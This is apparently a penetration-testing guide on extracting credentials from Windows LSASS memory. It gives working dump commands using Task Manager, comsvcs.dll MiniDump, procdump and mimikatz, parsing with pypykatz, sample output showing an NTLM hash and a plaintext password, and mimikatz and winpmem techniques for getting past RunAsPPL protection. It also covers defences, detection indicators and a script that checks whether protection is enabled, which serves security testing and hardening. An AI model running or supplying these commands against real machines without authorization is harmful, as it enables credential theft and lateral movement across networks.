# LSASS

## LSASS Processes

The Local Security Authority Subsystem Service (LSASS) is a critical Windows process that handles authentication and security policies. For penetration testers and security professionals, understanding LSASS and how to interact with it can be invaluable for credential extraction during authorized security assessments.

### Understanding LSASS

LSASS (lsass.exe) is responsible for several key security functions:

* Authenticating users for local and remote logons
* Enforcing local security policies
* Generating access tokens
* Writing to Windows security log
* Handling password changes
* Caching credentials for domain authentication when the domain controller is unavailable

Most importantly for security professionals, LSASS caches credentials in memory, making it a high-value target during security assessments.

### LSASS Process Information

LSASS runs as a Windows system process with the following characteristics:

* Process name: `lsass.exe`
* Default location: `C:\Windows\System32\lsass.exe`
* Runs as `NT AUTHORITY\SYSTEM`
* Process is protected by various Windows security features in modern systems

### Dumping LSASS Memory

There are several methods to extract credentials from LSASS memory. All of these methods require administrative privileges.

#### Method 1: Task Manager

The simplest (but most detectable) method uses Windows Task Manager:

1. Open Task Manager (right-click Taskbar → Task Manager or Ctrl+Shift+Esc)
2. Navigate to the "Details" tab
3. Find `lsass.exe` in the list
4. Right-click → "Create dump file"
5. The dump will be saved to `%TEMP%\lsass.DMP`

#### Method 2: Process Explorer

Sysinternals Process Explorer provides a similar but more feature-rich option:

1. Download and run [Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer)
2. Find `lsass.exe` in the process list
3. Right-click → "Create Dump" → "Create Full Dump"

#### Method 3: Using PowerShell

PowerShell can be used to create memory dumps with the [Debug-Process](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/debug-process) cmdlet:

```powershell
# First get the process ID
Get-Process lsass

# Then create the dump
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

Where `672` is the process ID of LSASS from the first command. This technique is commonly used because it leverages built-in Windows components.

#### Method 4: Using Mimikatz

[Mimikatz](https://github.com/gentilkiwi/mimikatz) is a specialized tool for extracting credentials:

```cmd
# Launch mimikatz with admin privileges
mimikatz.exe

# Enable debug privileges
privilege::debug

# Dump credentials from LSASS
sekurlsa::logonpasswords
```

#### Method 5: Procdump from Sysinternals

Microsoft's [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) can create process dumps while avoiding many security detections:

```cmd
procdump.exe -ma lsass.exe lsass.dmp
```

### Extracting Credentials from LSASS Dumps

Once you have the memory dump, you need to extract the credentials.

#### Using Mimikatz

```cmd
# Launch mimikatz
mimikatz.exe

# Load the minidump module
sekurlsa::minidump lsass.dmp

# Extract credentials
sekurlsa::logonpasswords
```

Example output:

```
Authentication Id : 0 ; 515764 (00000000:0007df34)
Session           : Interactive from 1
User Name         : Administrator
Domain            : DESKTOP-H5NBDKV
Logon Server      : DESKTOP-H5NBDKV
Logon Time        : 8/25/2021 1:56:26 PM
SID               : S-1-5-21-3088908308-1677896653-3907355324-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : DESKTOP-H5NBDKV
         * NTLM     : 98d3a787a80d08385cea7fb4aa2a4261
         * SHA1     : f46418f73a14567803cb96b67fd8db1c29e21e3d
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : DESKTOP-H5NBDKV
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : DESKTOP-H5NBDKV
         * Password : Password123!
```

#### Using pypykatz (Linux)

[pypykatz](https://github.com/skelsec/pypykatz) is a Python implementation of Mimikatz that works on Linux systems:

```bash
# Install pypykatz
pip3 install pypykatz

# Parse the dump file
pypykatz lsa minidump lsass.dmp
```

Example output:

```
INFO:root:Parsing file lsass.dmp
FILE: ======== lsass.dmp =======
[...]
== LogonSession ==
authentication_id 515764 (0x7df34)
session_id 1
username Administrator
domainname DESKTOP-H5NBDKV
logon_server DESKTOP-H5NBDKV
logon_time 2021-08-25T13:56:26.932435+00:00
sid S-1-5-21-3088908308-1677896653-3907355324-500
luid 515764
        == MSV ==
                Username: Administrator
                Domain: DESKTOP-H5NBDKV
                LM: NA
                NT: 98d3a787a80d08385cea7fb4aa2a4261
                SHA1: f46418f73a14567803cb96b67fd8db1c29e21e3d
        == WDIGEST [14]==
                username Administrator
                domainname DESKTOP-H5NBDKV
                password None
        == Kerberos ==
                Username: Administrator
                Domain: DESKTOP-H5NBDKV
                Password: Password123!
```

### Types of Credentials in LSASS

LSASS stores various types of credentials:

1. **NTLM Hashes**: The primary format for Windows password storage
2. **Kerberos Tickets**: Used for Single Sign-On in domains
3. **Plaintext Passwords**: In some configurations, plaintext passwords may be recoverable
4. **Cached Domain Credentials**: Stored for offline domain authentication
5. **Service Account Credentials**: For background services and scheduled tasks

### Defensive Measures Against LSASS Credential Dumping

#### Windows Built-in Protections

Modern Windows systems include several protections against LSASS credential theft:

1.  **LSA Protection (RunAsPPL)**: Prevents direct memory access to LSASS

    ```powershell
    # Enable LSA Protection (requires reboot)
    New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value "1" -PropertyType DWORD -Force
    ```
2.  **Credential Guard**: Uses virtualization-based security to isolate secrets

    ```powershell
    # Enable through Group Policy
    # Computer Configuration > Administrative Templates > System > Device Guard > Turn On Virtualization Based Security
    ```
3. **Protected Process Light (PPL)**: Enhanced process protection

#### Detection Strategies

Security teams often monitor for these indicators of LSASS dumping:

1. Process access monitoring for lsass.exe
2. Creation of dump files
3. Use of tools like Mimikatz, ProcDump, or Task Manager dump functionality
4. Unusual handle creation to LSASS
5. Command-line monitoring for suspicious parameters

### Bypassing LSASS Protections

During authorized penetration tests, you might encounter systems with LSASS protections. Here are some bypass techniques (use only with permission):

#### Bypassing RunAsPPL

```cmd
# Using mimikatz (requires reboot)
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # sekurlsa::logonpasswords
```

#### Using Direct Physical Memory Access

```cmd
# Using winpmem to create a full memory dump
winpmem_mini_x64.exe memory.raw

# Then extract LSASS data using Rekall or Volatility
```

#### Remote Access

```powershell
# PowerShell remoting can sometimes bypass local protections
Enter-PSSession -ComputerName TARGET
# Then run credential extraction
```

### Attack-Defense Scenario

To illustrate the importance of LSASS protection, consider this example scenario:

1. **Initial Access**: Attacker gains administrator access to a workstation
2. **Credential Harvesting**: Dumps LSASS memory using rundll32.exe technique
3. **Defensive Monitoring**: Security team detects the LSASS memory access
4. **Lateral Movement**: Attacker uses harvested domain credentials to move laterally
5. **Defensive Response**: Security team isolates affected systems
6. **Remediation**: Domain-wide password reset to invalidate stolen credentials

### Best Practices for Security Testing

When performing authorized LSASS credential extraction:

1. **Document all activities**: Keep detailed records of all credential extraction
2. **Handle with care**: Treat extracted credentials as highly sensitive
3. **Clean up**: Remove dump files after analysis
4. **Report findings**: Document the ability to extract credentials in your report
5. **Recommend mitigations**: Suggest appropriate protections like Credential Guard

### LSASS Protection Verification

To verify if LSASS protection is enabled on a system:

```powershell
# Check if RunAsPPL is enabled
$lsaKey = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -ErrorAction SilentlyContinue
if ($lsaKey.RunAsPPL -eq 1) {
    Write-Host "LSA Protection is enabled" -ForegroundColor Green
} else {
    Write-Host "LSA Protection is disabled" -ForegroundColor Red
}

# Check if Credential Guard is running
$deviceGuard = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
if ($deviceGuard.SecurityServicesRunning -contains 1) {
    Write-Host "Credential Guard is enabled" -ForegroundColor Green
} else {
    Write-Host "Credential Guard is disabled" -ForegroundColor Red
}
```

### Conclusion

LSASS credential extraction remains a critical technique in penetration testing and security assessments. Understanding how LSASS stores credentials, the methods to extract them, and the protective measures available helps security professionals evaluate an organization's security posture against credential theft attacks.

Remember that LSASS credential dumping should only be performed with proper authorization during security assessments. Unauthorized extraction of credentials is illegal and unethical.
